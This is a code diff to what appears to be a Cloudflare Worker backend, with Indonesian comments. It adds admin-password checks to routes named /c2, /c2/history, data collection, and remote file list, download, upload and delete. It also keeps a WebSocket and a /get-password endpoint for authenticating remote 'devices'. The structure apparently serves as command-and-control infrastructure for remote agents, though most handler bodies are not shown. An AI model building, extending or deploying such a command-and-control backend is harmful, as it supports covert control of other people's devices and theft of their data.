@@ -3,7 +3,7 @@
 // ================================================================
 
 // ============================================================
-// KONFIGURASI (SIMPLE)
+// KONFIGURASI
 // ============================================================
 const MAX_DATA = 5000;
 const RATE_LIMIT = 100;
@@ -69,14 +69,14 @@ async function checkRateLimit(env, key) {
 }
 
 // ============================================================
-// AUTHENTICATION
+// AUTHENTICATION - UNTUK ADMIN (PAKAI ADMIN_PASSWORD)
 // ============================================================
 function isAuthenticated(request, env) {
   const url = new URL(request.url);
   const key = url.searchParams.get('key') || 
               request.headers.get('X-API-Key') || 
               request.headers.get('Authorization')?.replace('Bearer ', '');
-  return key === env.PASSWORD;
+  return key === env.ADMIN_PASSWORD;
 }
 
 // ============================================================
@@ -103,14 +103,14 @@ export default {
     }
 
     // ============================================================
-    // WEBSOCKET - /ws
+    // WEBSOCKET - /ws (PAKAI PASSWORD - DEVICE)
     // ============================================================
     if (url.pathname === '/ws') {
       return handleWebSocket(request, env);
     }
 
     // ============================================================
-    // GET /get-password - Ambil password dari worker
+    // GET /get-password - Untuk perangkat (kembalikan PASSWORD)
     // ============================================================
     if (url.pathname === '/get-password' && method === 'GET') {
       const origin = request.headers.get('Origin') || '';
@@ -130,7 +130,7 @@ export default {
       if (isAllowed && hasValidUA) {
         return jsonResponse({ 
           status: 'ok', 
-          password: env.PASSWORD,
+          password: env.PASSWORD,  // 🔥 Kembalikan PASSWORD (device)
           timestamp: Date.now()
         });
       }
@@ -152,67 +152,67 @@ export default {
         });
       }
 
-      // POST /data
+      // POST /data (ADMIN)
       if ((url.pathname === '/data' || url.pathname === '/api/data') && method === 'POST') {
         return await handlePostData(request, env);
       }
 
-      // POST /batch
+      // POST /batch (ADMIN)
       if ((url.pathname === '/batch' || url.pathname === '/api/batch') && method === 'POST') {
         return await handleBatchData(request, env);
       }
 
-      // GET /data
+      // GET /data (ADMIN)
       if ((url.pathname === '/data' || url.pathname === '/api/data') && method === 'GET') {
         return await handleGetData(request, env);
       }
 
-      // GET /stats
+      // GET /stats (ADMIN)
       if (url.pathname === '/stats' && method === 'GET') {
         return await handleStats(request, env);
       }
 
-      // POST /clear
+      // POST /clear (ADMIN)
       if (url.pathname === '/clear' && method === 'POST') {
         return await handleClear(request, env);
       }
 
-      // POST /delete
+      // POST /delete (ADMIN)
       if (url.pathname === '/delete' && method === 'POST') {
         return await handleDelete(request, env);
       }
 
-      // GET /c2
+      // GET /c2 (ADMIN)
       if (url.pathname === '/c2' && method === 'GET') {
         return await handleC2(request, env);
       }
 
-      // POST /c2
+      // POST /c2 (ADMIN)
       if (url.pathname === '/c2' && method === 'POST') {
         return await handleC2Post(request, env);
       }
 
-      // GET /c2/history
+      // GET /c2/history (ADMIN)
       if (url.pathname === '/c2/history' && method === 'GET') {
         return await handleC2History(request, env);
       }
 
-      // GET /api/files
+      // GET /api/files (ADMIN)
       if (url.pathname === '/api/files' && method === 'GET') {
         return await handleListFiles(request, env);
       }
 
-      // GET /api/download
+      // GET /api/download (ADMIN)
       if (url.pathname === '/api/download' && method === 'GET') {
         return await handleDownloadFile(request, env);
       }
 
-      // POST /api/upload
+      // POST /api/upload (ADMIN)
       if (url.pathname === '/api/upload' && method === 'POST') {
         return await handleUploadFile(request, env);
       }
 
-      // POST /api/delete
+      // POST /api/delete (ADMIN)
       if (url.pathname === '/api/delete' && method === 'POST') {
         return await handleDeleteFile(request, env);
       }
@@ -251,9 +251,14 @@ export default {
 };
 
 // ============================================================
-// HANDLER: POST /data
+// HANDLER: POST /data (ADMIN)
 // ============================================================
 async function handlePostData(request, env) {
+  // 🔥 Cek ADMIN_PASSWORD
+  if (!isAuthenticated(request, env)) {
+    return unauthorizedResponse();
+  }
+  
   try {
     const body = await request.json();
     
@@ -316,9 +321,14 @@ async function handlePostData(request, env) {
 }
 
 // ============================================================
-// HANDLER: POST /batch
+// HANDLER: POST /batch (ADMIN)
 // ============================================================
 async function handleBatchData(request, env) {
+  // 🔥 Cek ADMIN_PASSWORD
+  if (!isAuthenticated(request, env)) {
+    return unauthorizedResponse();
+  }
+  
   try {
     const body = await request.json();
     
@@ -360,9 +370,10 @@ async function handleBatchData(request, env) {
 }
 
 // ============================================================
-// HANDLER: GET /data
+// HANDLER: GET /data (ADMIN)
 // ============================================================
 async function handleGetData(request, env) {
+  // 🔥 Cek ADMIN_PASSWORD
   if (!isAuthenticated(request, env)) {
     return unauthorizedResponse();
   }
@@ -457,9 +468,10 @@ async function handleGetData(request, env) {
 }
 
 // ============================================================
-// HANDLER: GET /stats
+// HANDLER: GET /stats (ADMIN)
 // ============================================================
 async function handleStats(request, env) {
+  // 🔥 Cek ADMIN_PASSWORD
   if (!isAuthenticated(request, env)) {
     return unauthorizedResponse();
   }
@@ -499,9 +511,10 @@ async function handleStats(request, env) {
 }
 
 // ============================================================
-// HANDLER: POST /clear
+// HANDLER: POST /clear (ADMIN)
 // ============================================================
 async function handleClear(request, env) {
+  // 🔥 Cek ADMIN_PASSWORD
   if (!isAuthenticated(request, env)) {
     return unauthorizedResponse();
   }
@@ -540,9 +553,10 @@ async function handleClear(request, env) {
 }
 
 // ============================================================
-// HANDLER: POST /delete
+// HANDLER: POST /delete (ADMIN)
 // ============================================================
 async function handleDelete(request, env) {
+  // 🔥 Cek ADMIN_PASSWORD
   if (!isAuthenticated(request, env)) {
     return unauthorizedResponse();
   }
@@ -591,9 +605,14 @@ async function handleDelete(request, env) {
 }
 
 // ============================================================
-// HANDLER: GET /c2
+// HANDLER: GET /c2 (ADMIN)
 // ============================================================
 async function handleC2(request, env) {
+  // 🔥 Cek ADMIN_PASSWORD
+  if (!isAuthenticated(request, env)) {
+    return unauthorizedResponse();
+  }
+  
   try {
     const url = new URL(request.url);
     const deviceId = url.searchParams.get('device') || 'unknown';
@@ -643,9 +662,10 @@ async function handleC2(request, env) {
 }
 
 // ============================================================
-// HANDLER: POST /c2
+// HANDLER: POST /c2 (ADMIN)
 // ============================================================
 async function handleC2Post(request, env) {
+  // 🔥 Cek ADMIN_PASSWORD
   if (!isAuthenticated(request, env)) {
     return unauthorizedResponse();
   }
@@ -687,9 +707,10 @@ async function handleC2Post(request, env) {
 }
 
 // ============================================================
-// HANDLER: GET /c2/history
+// HANDLER: GET /c2/history (ADMIN)
 // ============================================================
 async function handleC2History(request, env) {
+  // 🔥 Cek ADMIN_PASSWORD
   if (!isAuthenticated(request, env)) {
     return unauthorizedResponse();
   }
@@ -704,9 +725,10 @@ async function handleC2History(request, env) {
 }
 
 // ============================================================
-// HANDLER: GET /api/files
+// HANDLER: GET /api/files (ADMIN)
 // ============================================================
 async function handleListFiles(request, env) {
+  // 🔥 Cek ADMIN_PASSWORD
   if (!isAuthenticated(request, env)) {
     return unauthorizedResponse();
   }
@@ -727,9 +749,10 @@ async function handleListFiles(request, env) {
 }
 
 // ============================================================
-// HANDLER: GET /api/download
+// HANDLER: GET /api/download (ADMIN)
 // ============================================================
 async function handleDownloadFile(request, env) {
+  // 🔥 Cek ADMIN_PASSWORD
   if (!isAuthenticated(request, env)) {
     return unauthorizedResponse();
   }
@@ -765,9 +788,10 @@ async function handleDownloadFile(request, env) {
 }
 
 // ============================================================
-// HANDLER: POST /api/upload
+// HANDLER: POST /api/upload (ADMIN)
 // ============================================================
 async function handleUploadFile(request, env) {
+  // 🔥 Cek ADMIN_PASSWORD
   if (!isAuthenticated(request, env)) {
     return unauthorizedResponse();
   }
@@ -819,9 +843,10 @@ async function handleUploadFile(request, env) {
 }
 
 // ============================================================
-// HANDLER: POST /api/delete
+// HANDLER: POST /api/delete (ADMIN)
 // ============================================================
 async function handleDeleteFile(request, env) {
+  // 🔥 Cek ADMIN_PASSWORD
   if (!isAuthenticated(request, env)) {
     return unauthorizedResponse();
   }
@@ -876,7 +901,7 @@ async function handleError(request, env) {
 }
 
 // ============================================================
-// HANDLER: WebSocket
+// HANDLER: WebSocket (PAKAI PASSWORD - DEVICE)
 // ============================================================
 async function handleWebSocket(request, env) {
   const upgradeHeader = request.headers.get('Upgrade');
@@ -897,6 +922,7 @@ async function handleWebSocket(request, env) {
       const data = JSON.parse(event.data);
       
       if (data.type === 'auth') {
+        // 🔥 Cek dengan PASSWORD (device), BUKAN ADMIN_PASSWORD
         if (data.key === env.PASSWORD) {
           authenticated = true;
           deviceId = data.deviceId || 'unknown';
